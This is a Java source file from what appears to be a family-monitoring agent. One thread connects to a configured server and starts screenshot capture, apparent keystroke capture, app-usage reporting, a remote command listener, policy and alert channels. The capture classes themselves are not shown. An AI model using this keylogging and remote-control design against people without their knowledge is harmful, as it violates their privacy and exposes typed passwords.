package com.family.agent.network;

import com.family.agent.controller.CommandListener;
import com.family.agent.util.ConfigLoader;

import java.net.Socket;

public class Uploader extends Thread {
	private final String serverHost;
	public Uploader()
	{
		serverHost = ConfigLoader.load().getServerHost();
	}
	
	public void run()
	{
		try
		{
			Socket soc1 = new Socket(serverHost, 5000);
			// gui hinh anh
			Screenshot s = new Screenshot(soc1, 3000);
			s.start();

			Socket soc2 = new Socket(serverHost, 2345);
			// gui ki tu
			Keystore k = new Keystore(soc2, 300000, 100);
			k.start();

			Socket appSocket = new Socket(serverHost, 1234);
			AppUsage appusage = new AppUsage(appSocket);
			appusage.start();

			Socket soccmd = new Socket(serverHost, 8888);
			CommandListener commandListener = new CommandListener(soccmd);
			commandListener.start();
			
			Socket soc3 = new Socket(serverHost,4321);
			Policy p = new Policy(soc3);
			p.start();
			
			Socket soc4 = new Socket(serverHost, 6969);
			Alert a = new Alert(soc4);
			a.start();
		}
		catch(Exception e)
		{
			e.printStackTrace();
		}
	
		
	}
}


